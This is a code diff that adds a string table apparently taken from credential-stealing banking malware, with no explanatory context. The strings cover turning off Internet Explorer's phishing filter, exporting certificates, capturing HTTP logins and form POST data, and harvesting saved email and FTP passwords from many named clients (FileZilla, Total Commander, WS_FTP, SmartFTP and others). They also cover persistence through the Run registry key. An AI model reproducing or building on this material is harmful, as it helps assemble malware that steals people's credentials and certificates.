@@ -1,0 +1,133 @@
+Software\Microsoft\Internet Explorer\Main
+Software\Microsoft\Internet Explorer\PhishingFilter
+Enabled
+EnabledV8
+Software\Microsoft\Internet Explorer\Privacy
+CleanCookies
+Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\%u
+1406
+1609
+Low
+pass
+certs\%s\%s_%02u_%02u_%04u.pfx
+grabbed
+profiles.ini
+Profile%u
+IsRelative
+Path
+user.js
+Software\Microsoft\Windows\Currentversion\Run
+HTTP authentication: username="%s", password="%s"
+
+HTTP authentication (encoded): %S
+
+%s%s
+Referer: %S
+User input: %s
+%sPOST data:
+
+%S
+ *BLOCKED*
+grabbed\%S_%02u_%02u_%02u.txt
+Grabbed data from: %s
+
+%S
+Macromedia\Flash Player
+*.sol
+ (S
+%sAccount name: %s
+E-mail: %s
+
+IMAP
+POP3
+SMTP
+grabbed\%S_%02u_%02u_%02u.txt
+0x%s
+%s:
+	Server: %s:%u%s
+	Username: %s
+	Password: %s
+
+ (S
+Store Root
+Salt
+account{*}.oeaccount
+SOFTWARE\Microsoft\WAB\DLLPath
+A8000A
+1.0
+EmailAddressCollection/EmailAddress[%u]/Address
+quick.dat
+history.dat
+pass
+SO
+datafolder
+*flashfxp*
+default
+host
+username
+password
+ftp://%s:%s@%s
+
+SOFTWARE\Ghisler\Total Commander
+ftpininame
+*totalcmd*
+*total*commander*
+*ghisler*
+SOFTWARE\Ghisler\Total Commander
+installdir
+HOST
+PORT
+UID
+PWD
+SOFTWARE\ipswitch\ws_ftp
+datadir
+*ipswitch*
+Pass
+*filezilla*
+SOFTWARE\Far\Plugins\ftp\hosts
+SOFTWARE\Far2\Plugins\ftp\hosts
+hostname
+username
+user
+password
+ftp://%s:%s@%s
+
+hostname
+portnumber
+username
+password
+ftp://%s:%s@%s:%u
+
+ftplist.txt
+ft
+SOFTWARE\ftpware\coreftp\sites
+host
+port
+user
+pw
+ftp://%s:%s@%s:%u
+
+*.xml
+FavoriteItem
+Host
+Port
+User
+Password
+SOFTWARE\smartftp\client 2.0\settings\general\favorites
+SOFTWARE\smartftp\client 2.0\settings\backup
+personal favorites
+folder
+SOFTWARE\Micros
+ProfileImagePath
+ftp
+anonymous
+%s://%s:%s@%s/
+ntdll.dll
+fatal_error
+user32.dll
+V	%08X
+C	%08X
+PS	%08X
+wtsapi32.dll
+userenv.dll
+userinit.exe
